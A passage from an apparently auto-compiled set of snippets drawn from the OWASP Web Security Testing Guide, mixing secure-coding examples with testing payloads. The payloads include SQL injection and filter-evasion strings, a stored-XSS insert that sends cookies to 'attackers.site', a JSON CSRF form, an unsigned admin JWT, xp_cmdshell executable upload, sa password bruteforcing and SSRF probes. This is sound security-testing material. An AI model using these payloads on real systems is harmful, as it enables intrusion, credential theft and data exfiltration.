txt\nCODE:\n```\neyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0K.eyJ1c2VybmFtZSI6ImFkbWluaW5pc3RyYXRvciIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.\n```\n\n----------------------------------------\n\nTITLE: Secure ORM Query Creation with Positional Parameters in Java\nDESCRIPTION: This snippet shows a secure way to create ORM queries using positional parameters. It allows the ORM layer to handle input sanitization and prevents SQL injection.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nQuery hqlQuery = session.createQuery(\"from Orders as orders where orders.id = ?\");\nList results = hqlQuery.setString(0, \"123-ADB-567-QTWYTFDL\").list(); // 0 is the first position, where it is dynamically replaced by the string set\n```\n\n----------------------------------------\n\nTITLE: Algorithm Confusion in Node.js JWT Verification\nDESCRIPTION: Example of Node.js code showing how the same verify method is used for both RS256 (public key) and HS256 (HMAC) algorithms, which can lead to algorithm confusion attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n// Verify a JWT signed using RS256\njwt.verify(token, publicKey);\n\n// Verify a JWT signed using HS256\njwt.verify(token, secretKey);\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Dynamic CORS Policy Implementation in PHP\nDESCRIPTION: A PHP code example showing an insecure implementation of dynamic CORS policy that allows requests from subdomains. The regular expression used may be bypassed if not carefully constructed with proper anchors.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nif (preg_match('|\\.example.com$|', $_SERVER['SERVER_NAME'])) {\n   header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");\n   ...\n}\n```\n\n----------------------------------------\n\nTITLE: JWT Payload Example in JSON\nDESCRIPTION: Example of a decoded JWT payload containing user information and standard claims. The payload includes username, admin status, issued-at time, and expiration time.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"username\": \"administrator\",\n  \"is_admin\": true,\n  \"iat\": 1516239022,\n  \"exp\": 1516242622\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Key-Value Entries in Local Storage with JavaScript\nDESCRIPTION: This code iterates through all entries in the browser's localStorage, retrieves each key-value pair, and logs them to the console. This is useful for identifying what sensitive data might be persistently stored by the application.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nfor (let i = 0; i < localStorage.length; i++) {\n  const key = localStorage.key(i);\n  const value = localStorage.getItem(key);\n  console.log(`${key}: ${value}`);\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Injection Using Character Encoding\nDESCRIPTION: Example of SQL injection using the CHAR() function to encode characters and evade detection.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_34\n\nLANGUAGE: sql\nCODE:\n```\n' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--\n```\n\n----------------------------------------\n\nTITLE: XSS Vulnerability in Message Processing\nDESCRIPTION: Example showing a potential XSS vulnerability when using innerHTML with message data, even when validating the origin.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.addEventListener(\"message\", callback, true);\n\nfunction callback(e) {\n        if(e.origin === \"trusted.domain.com\") {\n            element.innerHTML= e.data;\n        }\n}\n```\n\n----------------------------------------\n\nTITLE: Opening and Querying Web SQL Database in JavaScript\nDESCRIPTION: This snippet demonstrates how to open a Web SQL Database and execute a SQL query using the openDatabase(), transaction(), and executeSql() methods. It shows a basic insert operation into a 'LOGS' table.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nvar db = openDatabase(shortName, version, displayName, maxSize);\n\ndb.transaction(function(transaction) {\n    transaction.executeSql('INSERT INTO LOGS (time, id, log) VALUES (?, ?, ?)', [dateTime, id, log]);\n});\n```\n\n----------------------------------------\n\nTITLE: Vulnerable ActionScript 2.0 Code with Undefined Variables\nDESCRIPTION: Example of vulnerable ActionScript 2.0 code that uses an uninitialized global variable (_root.language) which could be overwritten via FlashVars, potentially leading to XML injection.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_4\n\nLANGUAGE: actionscript\nCODE:\n```\nmovieClip 328 __Packages.Locale {\n\n#initclip\n    if (!_global.Locale) {\n    var v1 = function (on_load) {\n        var v5 = new XML();\n        var v6 = this;\n        v5.onLoad = function (success) {\n        if (success) {\n            trace('Locale loaded xml');\n            var v3 = this.xliff.file.body.$trans_unit;\n            var v2 = 0;\n            while (v2 < v3.length) {\n            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;\n            ++v2;\n            }\n            on_load();\n        } else {}\n        };\n        if (_root.language != undefined) {\n        Locale.DEFAULT_LANG = _root.language;\n        }\n        v5.load(Locale.DEFAULT_LANG + '/player_' +\n                            Locale.DEFAULT_LANG + '.xml');\n    };\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Controller Implementation in Spring MVC\nDESCRIPTION: A Spring MVC controller method that handles user creation requests. It demonstrates autobinding vulnerability by directly binding HTTP request parameters to the User model without filtering sensitive fields.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md#2025-04-22_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n@RequestMapping(value = \"/createUser\", method = RequestMethod.POST)\npublic String createUser(User user) {\n   userService.add(user);\n   return \"successPage\";\n}\n```\n\n----------------------------------------\n\nTITLE: Identifying Key Input Variables in Different Web Languages\nDESCRIPTION: A table summarizing special variables and functions used in PHP, ASP, and JSP to handle HTTP request data that should be examined during security testing. These variables are common entry points for potential XSS vulnerabilities.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_7\n\nLANGUAGE: Markdown\nCODE:\n```\n| **PHP**        | **ASP**           |  **JSP**         |\n|----------------|-------------------|------------------|\n| `$_GET` - HTTP GET variables  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET and POST |\n| `$_POST` - HTTP POST variables| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST variables |\n| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files | |\n| `$_FILES` - HTTP File Upload variables | | |\n```\n\n----------------------------------------\n\nTITLE: SQL Injection for Inserting JavaScript into Database Footer\nDESCRIPTION: This SQL query demonstrates how an attacker could inject JavaScript code into a database table to create a persistent XSS vulnerability. It updates the 'notice' field in the 'footer' table with malicious JavaScript that sends user cookies to an attacker's site.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability.md#2025-04-22_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT field1, field2, field3\nFROM table_x\nWHERE field2 = 'x';\n   UPDATE footer\n   SET notice = 'Copyright 1999-2030%20\n       <script>document.write(\\'<img src=\"https://attackers.site/cv.jpg?\"+document.cookie+\"\">\\')</script>'\n   WHERE notice = 'Copyright 1999-2030';\n```\n\n----------------------------------------\n\nTITLE: Analyzing a POST Request for Session Token Exposure in HTTP\nDESCRIPTION: This HTTP request example demonstrates how a session token might be transmitted in a POST request. It shows the complete request including headers and body content, highlighting how session identifiers can be exposed in different parts of the request.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nPOST /login.asp HTTP/1.1\nHost: owaspapp.com\n[...]\nCookie: ASPSESSIONIDABCDEFG=ASKLJDLKJRELKHJG\nContent-Length: 51\n\nLogin=Username&password=Password&SessionID=12345678\n```\n\n----------------------------------------\n\nTITLE: Sending Authentication POST Request in HTTP\nDESCRIPTION: This code snippet demonstrates an HTTP POST request for authentication. It includes the session cookie in the request headers and sends login credentials in the request body, which is a key step in testing session fixation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nPOST /authentication.php HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://www.example.com\nCookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1\nContent-Type: application/x-www-form-urlencoded\nContent-length: 57\n\nName=Meucci&wpPassword=secret!&wpLoginattempt=Log+in\n```\n\n----------------------------------------\n\nTITLE: Exploiting CSRF with JSON Payload using HTML Form\nDESCRIPTION: This HTML code demonstrates a CSRF attack that sends a JSON payload using a form with text/plain encoding. It bypasses the limitation of JSON not having query parameters by including the JSON data in a hidden input field.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<html>\n <body>\n  <script>history.pushState('', '', '/')</script>\n   <form action='https://victimsite.com' method='POST' enctype='text/plain'>\n     <input type='hidden' name='{\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"'value='something\"}' />\n     <input type='submit' value='Submit request' />\n   </form>\n </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: SQL Injection with String Concatenation\nDESCRIPTION: Example of SQL injection using string concatenation to break up SQL keywords and evade filters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_35\n\nLANGUAGE: sql\nCODE:\n```\nEXEC('SEL' + 'ECT 1')\n```\n\n----------------------------------------\n\nTITLE: Vulnerable PHP Database Connection Script\nDESCRIPTION: An example of a sensitive PHP file with database credentials that should not be directly accessible. This demonstrates how a file with the .inc extension might contain hardcoded database credentials which would be exposed if accessed directly.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md#2025-04-22_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n    mysql_connect(\"127.0.0.1\", \"root\", \"password\")\n        or die(\"Could not connect\");\n?>\n```\n\n----------------------------------------\n\nTITLE: Identifying Hardcoded AWS Credentials in JavaScript\nDESCRIPTION: Example of hardcoded AWS S3 credentials in JavaScript code. This is a severe security risk as it exposes cloud service access keys.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst myS3Credentials = {\n  accessKeyId: config('AWSS3AccessKeyID'),\n  secretAccessKey: config('AWSS3SecretAccessKey'),\n};\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Web SQL Database Query in JavaScript\nDESCRIPTION: This code snippet illustrates a vulnerable implementation of a Web SQL Database query. It extracts a user ID from the URL hash without proper sanitization, potentially allowing SQL injection attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// URL example: https://example.com/user#15\nvar userId = document.location.hash.substring(1,); // Grabs the ID without the hash -> 15\n\ndb.transaction(function(transaction){\n    transaction.executeSQL('SELECT * FROM users WHERE user = ' + userId);\n});\n```\n\n----------------------------------------\n\nTITLE: SQL Server OPENROWSET Bruteforce Query\nDESCRIPTION: SQL query that attempts to bruteforce the sysadmin (sa) password using OPENROWSET by leveraging timing-based inference. The query connects to the local database and introduces a delay if successful, allowing password guessing through response time measurement.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\nselect * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')\n```\n\n----------------------------------------\n\nTITLE: Path Confusion Example in Django URL Configuration\nDESCRIPTION: Example of incorrect path configuration in Django's urls.py that demonstrates a path confusion vulnerability. The regular expression pattern r'.*^dashboard' is improperly configured, allowing potential web cache deception attacks through paths like '/dashboard/none.js'.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion.md#2025-04-22_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n    from django.urls import re_path\n    from . import views\n\n    urlpatterns = [\n\n        re_path(r'.*^dashboard', views.path_confusion ,name = 'index'),\n\n    ]\n```\n\n----------------------------------------\n\nTITLE: Basic Host Header Injection HTTP Request\nDESCRIPTION: A simple HTTP request demonstrating Host header injection by supplying an attacker-controlled domain in the Host header field. This can cause the web server to process the request as if it came from the attacker's domain.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nGET / HTTP/1.1\nHost: www.attacker.com\n[...]\n```\n\n----------------------------------------\n\nTITLE: Testing DELETE Method in RESTful API\nDESCRIPTION: Shows how to use the DELETE method in a RESTful API to delete a user object. This is a common operation in modern APIs.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_9\n\nLANGUAGE: http\nCODE:\n```\nDELETE /api/users/foo HTTP/1.1\nHost: example.org\n```\n\n----------------------------------------\n\nTITLE: Uploading Executables using Windows debug.exe in SQL Server\nDESCRIPTION: A technique to upload executables when FTP is blocked, by using Windows debug.exe to create an executable from a debug script. The script is uploaded line by line using xp_cmdshell and then executed with debug.exe.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nexec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--\nexec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--\n....\nexec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--\nexec master..xp_cmdshell 'debug.exe < debugscript.txt';--\n```\n\n----------------------------------------\n\nTITLE: Searching for Hardcoded Credentials in Source Code\nDESCRIPTION: This grep command searches recursively for patterns that might indicate hardcoded passwords, encryption keys, or other sensitive information in source code or configuration files.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngrep -r –E \"Pass | password | pwd |user | guest| admin | encry | key | decrypt | sharekey \" ./PathToSearch/\n```\n\n----------------------------------------\n\nTITLE: Netcat Server Setup for Out-of-Band SQL Injection\nDESCRIPTION: Bash command to set up a Netcat listener for capturing out-of-band SQL injection data responses.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\n/home/tester/nc –nLp 80\n\nGET /SCOTT HTTP/1.1\nHost: testerserver.com\nConnection: close\n```\n\n----------------------------------------\n\nTITLE: Potentially Vulnerable Java APIs for XXE\nDESCRIPTION: Lists Java APIs that may be vulnerable to XML External Entity (XXE) attacks if not configured properly. These should be reviewed during source code analysis.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_11\n\nLANGUAGE: text\nCODE:\n```\njavax.xml.parsers.DocumentBuilder\njavax.xml.parsers.DocumentBuildFactory\norg.xml.sax.EntityResolver\norg.dom4j.*\njavax.xml.parsers.SAXParser\njavax.xml.parsers.SAXParserFactory\nTransformerFactory\nSAXReader\nDocumentHelper\nSAXBuilder\nSAXParserFactory\nXMLReaderFactory\nXMLInputFactory\nSchemaFactory\nDocumentBuilderFactoryImpl\nSAXTransformerFactory\nDocumentBuilderFactoryImpl\nXMLReader\nXerces: DOMParser, DOMParserImpl, SAXParser, XMLParser\n```\n\n----------------------------------------\n\nTITLE: Demonstrating HTTP POST Request for Authentication Bypass in Blogger\nDESCRIPTION: This code snippet shows an example of an HTTP POST request that exploits an HPP vulnerability in Blogger's authentication mechanism. It demonstrates how multiple occurrences of the 'blogID' parameter could be used to bypass security checks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\nPOST /add-authors.do HTTP/1.1\n[...]\n\nsecurity_token=attackertoken&blogID=attackerblogidvalue&blogID=victimblogidvalue&authorsList=goldshlager19test%40gmail.com(attacker email)&ok=Invite\n```\n\n----------------------------------------\n\nTITLE: Resulting HTTP POST Request for JSON CSRF Exploit\nDESCRIPTION: This snippet shows the HTTP POST request that results from submitting the JSON CSRF exploit form. It demonstrates how the JSON payload is sent as plain text in the request body.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nPOST / HTTP/1.1\nHost: victimsite.com\nContent-Type: text/plain\n\n{\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"=something\"}\n```\n\n----------------------------------------\n\nTITLE: Calculating Secure Hash for Payment Gateway in PHP\nDESCRIPTION: This snippet demonstrates how to calculate a secure hash (MD5) for a payment gateway transaction. It combines merchant ID, transaction ID, items, total value, and a secret key to create a hash that prevents tampering with transaction details.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md#2025-04-22_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$secure_hash = md5($merchant_id . $transaction_id . $items . $total_value . $secret)\n```\n\n----------------------------------------\n\nTITLE: Testing Broken Access Control in GraphQL\nDESCRIPTION: This snippet demonstrates how to test for broken access control in a GraphQL API by using an extracted token to perform unauthorized actions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#2025-04-22_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nquery brokenAccessControl {\n  myInfo(accessToken:\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew\", veterinaryId: 2){\n    id, name, dogs {\n      name\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GraphQL Query with Modified Object ID\nDESCRIPTION: Example of a GraphQL query with a modified object ID to test for BOLA vulnerabilities in GraphQL APIs. This shows how to request user data by manipulating the user ID in the query.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization.md#2025-04-22_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nquery { user(id: \"124\") { name, email } }\n```\n\n----------------------------------------\n\nTITLE: Basic MongoDB Where Clause Query\nDESCRIPTION: Demonstrates a simple MongoDB query using the $where operator to filter records based on a credit/debit comparison\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ndb.myCollection.find( { $where: \"this.credits == this.debits\" } );\n```\n\n----------------------------------------\n\nTITLE: Bypassing Non-Recursive XSS Filters\nDESCRIPTION: This example demonstrates how to bypass XSS filters that only apply sanitization once by nesting the payload within itself.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n<scr<script>ipt>alert(document.cookie)</script>\n```\n\n----------------------------------------\n\nTITLE: Bypassing Method Restrictions with X-HTTP-Method Header\nDESCRIPTION: Example of using the X-HTTP-Method header to override the actual HTTP method from GET to DELETE, successfully circumventing the server's method restrictions as shown by the 200 OK response.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_17\n\nLANGUAGE: http\nCODE:\n```\nGET /resource.html HTTP/1.1\nHost: example.org\nX-HTTP-Method: DELETE\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\n[...]\n```\n\n----------------------------------------\n\nTITLE: SQL Injection Using Declared Variables\nDESCRIPTION: Example of SQL injection by declaring variables to store and execute malicious SQL statements.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_36\n\nLANGUAGE: sql\nCODE:\n```\n; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');\nEXEC(@SQLivar)\n```\n\n----------------------------------------\n\nTITLE: Exploiting Prototype Chain for Data Leakage\nDESCRIPTION: HTML/JavaScript code that demonstrates how to exploit prototype chaining by overriding Array.prototype.forEach to leak sensitive data from the target script.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n...\n <div id=\"result\">\n\n    </div>\n    <script>\n      Array.prototype.forEach = function(callback) {\n        var resultString = \"Your secret values are: <b>\";\n        for (var i = 0, length = this.length; i < length; i++) {\n          if (i > 0) {\n            resultString += \", \";\n          }\n          resultString += this[i];\n        }\n        resultString += \"</b>\";\n        var div = document.getElementById(\"result\");\n        div.innerHTML = resultString;\n      };\n    </script>\n    <script src=\"https://victim.com/..../javascript.js\"></script>\n...\n```\n\n----------------------------------------\n\nTITLE: Vulnerable getURL Implementation in ActionScript 2.0\nDESCRIPTION: Shows vulnerable usage of getURL function in ActionScript 2.0 where an undefined variable (_root.URI) is used as the first argument, allowing JavaScript injection.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_7\n\nLANGUAGE: actionscript\nCODE:\n```\ngetURL(_root.URI,'_targetFrame');\n```\n\n----------------------------------------\n\nTITLE: Finding Hidden Forms in HTML\nDESCRIPTION: Example of a disabled form that reveals sensitive functionality for password recovery. Even though the submit button is commented out, the form action URL reveals the endpoint that might be directly accessible.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"forgotPassword.jsp\" method=\"post\">\n    <input type=\"hidden\" name=\"userID\" value=\"123\">\n    <!-- <input type=\"submit\" value=\"Forgot Password\"> -->\n</form>\n```\n\n----------------------------------------\n\nTITLE: Implementing Moderate Strict CSP Policy Header\nDESCRIPTION: A moderate strict Content Security Policy configuration that provides protection against XSS attacks while allowing nonce-based scripts and dynamic script loading.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md#2025-04-22_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nscript-src 'nonce-r4nd0m' 'strict-dynamic';\nobject-src 'none'; base-uri 'none';\n```\n\n----------------------------------------\n\nTITLE: SSTI Exploitation Example with cURL\nDESCRIPTION: This command demonstrates how to exploit a Server-side Template Injection vulnerability by passing a template expression in a URL parameter that will be evaluated by the server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ curl -g 'https://www.target.com/page?name={{7*7}}'\nHello 49!\n```\n\n----------------------------------------\n\nTITLE: Listing All Cookies with JavaScript\nDESCRIPTION: This simple one-line snippet displays all cookies accessible to the current document. Cookies are often used for session management and may contain sensitive information that should be protected with proper attributes.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log(window.document.cookie);\n```\n\n----------------------------------------\n\nTITLE: OAuth Token Request for Code Injection Testing\nDESCRIPTION: Example POST request to token endpoint for testing authorization code injection\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n    \"errorPath\":\"/error\",\n    \"client_id\":\"example-client\",\n    \"code\":\"INJECT_CODE_HERE\",\n    \"grant_type\":\"authorization_code\",\n    \"redirect_uri\":\"https://client.example.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: HTTP Request for Administrator Function with Admin Session\nDESCRIPTION: HTTP POST request for deleting an event as an administrator. This example demonstrates the format of a privileged function request that could be tested for vertical privilege escalation by substituting the session ID.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nPOST /account/deleteEvent HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=ADMINISTRATOR_USER_SESSION\n\nEventID=1000001\n```\n\n----------------------------------------\n\nTITLE: Executing SQL using sp_makewebtask in SQL Server\nDESCRIPTION: This SQL injection payload uses the deprecated sp_makewebtask stored procedure to write the output of a SQL query to a text file in the web root. This requires appropriate permissions on the database server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nexec sp_makewebtask 'C:\\Inetpub\\wwwroot\\test.txt', 'select * from master.dbo.sysobjects'--\n```\n\n----------------------------------------\n\nTITLE: URL Component Encoding/Decoding in JavaScript\nDESCRIPTION: JavaScript functions for encoding and decoding URL components, handling all special URL characters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/F-Leveraging_Dev_Tools.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nencodeURIComponent(\"string-to-encode\")  // URL encode\ndecodeURIComponent(\"string-to-decode\")  // URL decode\n```\n\n----------------------------------------\n\nTITLE: SSRF Payload to Access Restricted Local Pages\nDESCRIPTION: HTTP request showing an SSRF payload that attempts to access a restricted admin page through the localhost address.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nGET https://example.com/page?page=http://localhost/admin\n```\n\n----------------------------------------\n\nTITLE: Recommended RSA Encryption Padding Modes\nDESCRIPTION: This snippet lists the recommended padding modes for RSA encryption, which are important for ensuring the security of RSA implementations.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md#2025-04-22_snippet_2\n\nLANGUAGE: 